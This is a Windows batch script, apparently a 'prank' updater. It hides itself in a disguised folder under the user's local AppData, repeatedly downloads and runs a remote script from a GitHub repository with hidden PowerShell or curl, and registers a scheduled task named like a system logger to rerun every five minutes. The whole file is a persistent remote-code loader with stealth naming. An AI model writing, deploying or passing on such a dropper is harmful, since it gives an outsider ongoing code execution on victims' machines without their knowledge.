@echo off
setlocal enabledelayedexpansion

:: ============================================================
::   UPDATER – checks for new prank version, runs syslog.cmd
::   Stores files in %LOCALAPPDATA%\.sysupdatecom (hidden)
::   No administrator rights needed.
:: ============================================================

:: ---------- CONFIGURATION ----------
set "BASE=%LOCALAPPDATA%\.sysupdatecom"
set "UPDATER_SELF=%BASE%\updater.cmd"
set "PRANK_FILE=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "PRANK_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "MAX_RETRIES=3"
:: ===================================

:: Create hidden base folder
if not exist "%BASE%" mkdir "%BASE%"
attrib +h "%BASE%" >nul 2>&1

:: Self‑install (copy updater to BASE)
if /i not "%~f0"=="%UPDATER_SELF%" (
    copy /Y "%~f0" "%UPDATER_SELF%" >nul
    attrib +h "%UPDATER_SELF%" >nul 2>&1
)

:: ---------- FUNCTION: DOWNLOAD WITH RETRIES ----------
:DOWNLOAD
set "URL=%~1"
set "OUT=%~2"
set "RETRY_COUNT=0"

:RETRY_LOOP
set /a RETRY_COUNT+=1
if !RETRY_COUNT! gtr %MAX_RETRIES% (
    echo Failed to download %URL% after %MAX_RETRIES% attempts.
    exit /b 1
)

:: Method 1: PowerShell
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '!URL!' -OutFile '!OUT!' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
if exist "!OUT!" (
    for %%A in ("!OUT!") do if %%~zA gtr 0 exit /b 0
)

:: Method 2: curl (if available)
where curl >nul 2>&1
if !errorlevel! equ 0 (
    curl -s -L -o "!OUT!" "!URL!" >nul 2>&1
    if exist "!OUT!" (
        for %%A in ("!OUT!") do if %%~zA gtr 0 exit /b 0
    )
)

timeout /t 2 /nobreak >nul
goto RETRY_LOOP
:: ------------------------------------------------

:: ---------- CHECK FOR UPDATED PRANK SCRIPT ----------
call :DOWNLOAD "%VERSION_URL%" "%REMOTE_VER%"
if exist "%REMOTE_VER%" (
    set /p REMOTE=<"%REMOTE_VER%"
    if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"
    if not "!LOCAL!"=="!REMOTE!" (
        echo Updating prank from !LOCAL! to !REMOTE! ...
        call :DOWNLOAD "%PRANK_URL%" "%TEMP%\syslog.cmd"
        if exist "%TEMP%\syslog.cmd" (
            move /Y "%TEMP%\syslog.cmd" "%PRANK_FILE%" >nul
            echo !REMOTE! > "%LOCAL_VER%"
            attrib +h "%PRANK_FILE%" >nul 2>&1
        ) else (
            echo Failed to download prank update.
        )
    )
)

:: ---------- RUN THE PRANK ----------
if exist "%PRANK_FILE%" (
    start "" "%PRANK_FILE%"
) else (
    echo Prank file missing – cannot run.
)

:: ---------- ENSURE SCHEDULED TASK RUNS UPDATER EVERY 5 MINUTES ----------
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER_SELF%\"" /sc minute /mo 5 /f >nul 2>&1

endlocal